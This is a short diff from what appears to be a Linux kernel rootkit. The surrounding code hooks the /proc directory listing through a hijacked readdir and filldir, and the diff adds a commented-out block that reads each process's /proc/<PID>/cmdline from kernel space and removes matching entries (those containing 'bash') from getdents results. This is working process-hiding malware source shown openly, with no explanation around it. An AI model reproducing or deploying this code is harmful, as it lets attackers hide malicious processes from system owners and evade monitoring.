@@ -66,3 +66,62 @@ static int hijacked_readdir(struct file *filep, void *dirent, filldir_t filldir)
 	
 	return real_proc_readdir(filep, dirent, hijacked_filldir);
 }
+
+/*
+pdirp = cdirp;
+		cdirp = (struct linux_dirent*)(start_offset + i);
+		
+		if (isnumber(cdirp->d_name)){ //dirent is a process
+			for (k = 0; k<1024; k++){
+				kbuf[k] = 0;
+				kbuf2[k] = 0;
+			}
+			//initialize kbuf2 to the process cmdline folder /proc/<PID>/cmdline
+			kbuf2[0] = '/';
+			kbuf2[1] = 'p';
+			kbuf2[2] = 'r';
+			kbuf2[3] = 'o';
+			kbuf2[4] = 'c';
+			kbuf2[5] = '/';
+			size = strlen(cdirp->d_name);
+			for (k = 0; k < size; k++){
+				kbuf2[k+6] = (cdirp->d_name)[k];
+			}
+			kbuf2[size+6] = '/';
+			kbuf2[size+7] = 'c';
+			kbuf2[size+8] = 'm';
+			kbuf2[size+9] = 'd';
+			kbuf2[size+10] = 'l';
+			kbuf2[size+11] = 'i';
+			kbuf2[size+12] = 'n';
+			kbuf2[size+13] = 'e';
+			//open
+			fcmdline = filp_open(kbuf2, O_RDONLY,0);
+			
+			if (fcmdline == NULL) printk(KERN_ALERT "filp_open error.\n");
+			else {
+				//get current segment descriptor
+				fs = get_fs();
+				//set segment descriptor associated to kernel space
+				set_fs(get_ds());
+				//read file
+				fcmdline->f_op->read(fcmdline, kbuf, 1024, &fcmdline->f_pos);
+				//restore segment descriptor
+				set_fs(fs);
+				//check process for "test"
+				printk(KERN_INFO "kbuf: %s\n",kbuf);
+				if(strstr(kbuf, "bash")!=NULL){
+					printk("File to hide %s\n", kbuf2);
+					if(i>0) {
+						pdirp->d_reclen += cdirp->d_reclen;
+					}
+					else dirp = (struct linux_dirent *)(start_offset + (long)(cdirp->d_reclen));
+					
+					//adjust numread total returned by getdents and set cdirp to the new adjusted entry
+					//num_reads -= pdirp->d_reclen;
+					//cdirp=pdirp;
+				}
+
+			}
+			filp_close(fcmdline, NULL);
+			*/
